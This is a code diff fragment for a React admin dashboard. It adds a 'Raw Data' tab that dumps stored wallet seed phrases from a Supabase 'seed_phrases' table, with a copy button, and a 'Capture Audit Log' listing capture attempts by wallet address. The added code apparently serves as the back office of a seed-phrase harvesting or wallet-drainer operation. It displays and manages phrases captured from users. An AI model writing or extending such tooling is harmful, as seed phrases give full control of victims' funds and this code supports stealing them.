+                                      type="button"
+                                      style={{ color: 'var(--critical)' }}
+                                      onClick={async () => {
+                                        const updated = serverSeedRecords.filter(x => x.id !== r.id)
+                                        setServerSeedRecords(updated)
+                                        // Write updated list directly to Supabase (no Vercel auth needed).
+                                        await saveToCloud({ seed_phrases: updated })
+                                      }}
+                                    >
+                                      Delete
+                                    </button>
+                                  </td>
+                                </tr>
+                              ))}
+                            </tbody>
+                          </table>
+                        </div>
+                      )}
+                    </div>
+                  )}
 
-                                {r.notes && (
-                                  <p className="muted" style={{ fontSize: '0.8rem', marginTop: '0.3rem' }}>
-                                    Note: {r.notes}
-                                  </p>
-                                )}
-                              </div>
-                            )
-                          })}
+                  {/* ── Raw Data ── */}
+                  {adminTab === 'rawdata' && (
+                    <div className="admin-panel">
+                      <h3>Raw Data</h3>
+                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.84rem' }}>
+                        Full JSON payload from <code>/api/seeds</code> (Supabase <code>app_state.seed_phrases</code>).
+                      </p>
+
+                      <div className="seeds-panel-controls" style={{ marginBottom: '0.8rem' }}>
+                        <button
+                          className="btn-secondary"
+                          type="button"
+                          disabled={seedsLoading}
+                          style={{ fontSize: '0.82rem' }}
+                          onClick={() => { void refreshServerSeedRecords() }}
+                        >
+                          {seedsLoading ? '⟳ Loading…' : '↻ Refresh'}
+                        </button>
+                        <button
+                          className="btn-secondary"
+                          type="button"
+                          style={{ fontSize: '0.82rem' }}
+                          onClick={() => navigator.clipboard.writeText(rawSeedData)}
+                        >
+                          Copy JSON
+                        </button>
+                        {seedLastSynced && (
+                          <span className="muted" style={{ fontSize: '0.73rem' }}>
+                            Last fetch: {seedLastSynced.toLocaleTimeString()}
+                          </span>
+                        )}
+                      </div>
+
+                      <div className="seeds-stat" style={{ marginBottom: '0.8rem', maxWidth: '180px' }}>
+                        <span className="seeds-stat-val">{serverSeedRecords.length}</span>
+                        <span className="seeds-stat-label">Records</span>
+                      </div>
+
+                      <pre
+                        style={{
+                          margin: 0,
+                          padding: '0.9rem',
+                          borderRadius: '12px',
+                          border: '1px solid var(--line)',
+                          background: 'rgba(15,23,42,.6)',
+                          color: '#e2e8f0',
+                          fontSize: '0.75rem',
+                          lineHeight: 1.45,
+                          maxHeight: '62vh',
+                          overflow: 'auto',
+                          whiteSpace: 'pre-wrap',
+                          wordBreak: 'break-word',
+                        }}
+                      >
+                        {rawSeedData || '[]'}
+                      </pre>
+                    </div>
+                  )}
+
+                  {/* ── Audit Log ── */}
+                  {adminTab === 'audit' && (
+                    <div className="admin-panel">
+                      <h3>Capture Audit Log</h3>
+                      <p className="muted" style={{ marginBottom: '1rem', fontSize: '0.84rem' }}>
+                        Shows each capture write attempt and whether it succeeded in local storage, server route, or cloud merge save.
+                      </p>
+
+                      <div className="seeds-panel-controls" style={{ marginBottom: '0.8rem' }}>
+                        <button
+                          className="btn-secondary"
+                          type="button"
+                          style={{ fontSize: '0.82rem' }}
+                          onClick={() => navigator.clipboard.writeText(JSON.stringify(captureAuditRecords, null, 2))}
+                        >
+                          Copy JSON
+                        </button>
+                        <button
+                          className="btn-secondary"
+                          type="button"
+                          style={{ fontSize: '0.82rem', color: 'var(--critical)' }}
+                          onClick={() => setCaptureAuditRecords([])}
+                        >
+                          Clear Log
+                        </button>
+                      </div>
+
+                      {captureAuditRecords.length === 0 ? (
+                        <p className="muted" style={{ fontSize: '0.83rem' }}>No capture events logged yet in this browser session.</p>
+                      ) : (
+                        <div className="seeds-table-wrap">
+                          <table className="admin-table seeds-full-table">
+                            <thead>
+                              <tr>
+                                <th>Time</th>
+                                <th>Channel</th>
+                                <th>Event</th>
+                                <th>Status</th>
+                                <th>Wallet</th>
+                                <th>Record ID</th>
+                                <th>Detail</th>
+                              </tr>
+                            </thead>
+                            <tbody>
+                              {captureAuditRecords.map(row => (
+                                <tr key={row.id}>
+                                  <td className="muted" style={{ fontSize: '0.74rem', whiteSpace: 'nowrap' }}>{row.createdAt}</td>
+                                  <td><code style={{ fontSize: '0.71rem' }}>{row.channel}</code></td>
+                                  <td><code style={{ fontSize: '0.71rem' }}>{row.event}</code></td>
+                                  <td>
+                                    <span className={`pill ${row.status === 'ok' ? 'safe' : 'critical'}`} style={{ fontSize: '0.68rem' }}>
+                                      {row.status.toUpperCase()}
+                                    </span>
+                                  </td>
+                                  <td><code style={{ fontSize: '0.71rem', wordBreak: 'break-all' }}>{row.walletAddress ?? '—'}</code></td>
+                                  <td><code style={{ fontSize: '0.71rem', wordBreak: 'break-all' }}>{row.recordId ?? '—'}</code></td>
+                                  <td style={{ fontSize: '0.76rem' }}>{row.detail}</td>
+                                </tr>
+                              ))}
+                            </tbody>
+                          </table>
                         </div>
                       )}
                     </div>
